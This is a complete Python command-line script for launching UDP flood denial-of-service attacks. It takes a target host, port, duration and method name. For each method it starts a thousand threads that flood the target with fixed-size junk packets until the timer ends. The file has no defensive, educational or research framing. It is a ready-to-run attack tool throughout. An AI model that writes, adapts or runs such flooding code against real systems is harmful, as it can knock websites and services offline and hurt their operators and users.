import sys
import socket
import threading
import time as clock

host = str(sys.argv[1])
port = int(sys.argv[2])
time = int(sys.argv[3])
method = str(sys.argv[4])

def flood_udp():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while True: s.send(b"\x99" * 373)
    except: return s.close()

def power_udp():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while True: s.send(b"\x99" * 730)
    except: return s.close()

def udp_mix():
    try:
        threading.Thread(target=power_udp, daemon=True).start()
        threading.Thread(target=flood_udp, daemon=True).start()
    except: return

def attack_hq(timeout):
    while True:
        if clock.time() > timeout: exit()
        if clock.time() < timeout: clock.sleep(0.1)

def saphyra():
    global method
    timeout = clock.time() + time
    if method == "UDP-FLOOD":
        for sequence in range(1000):
            threading.Thread(target=flood_udp, daemon=True).start()
    if method == "UDP-POWER":
        for sequence in range(1000):
            threading.Thread(target=power_udp, daemon=True).start()
    if method == "UDP-MIX":
        for sequence in range(1000):
            threading.Thread(target=udp_mix, daemon=True).start()
    attack_hq(timeout)
saphyra()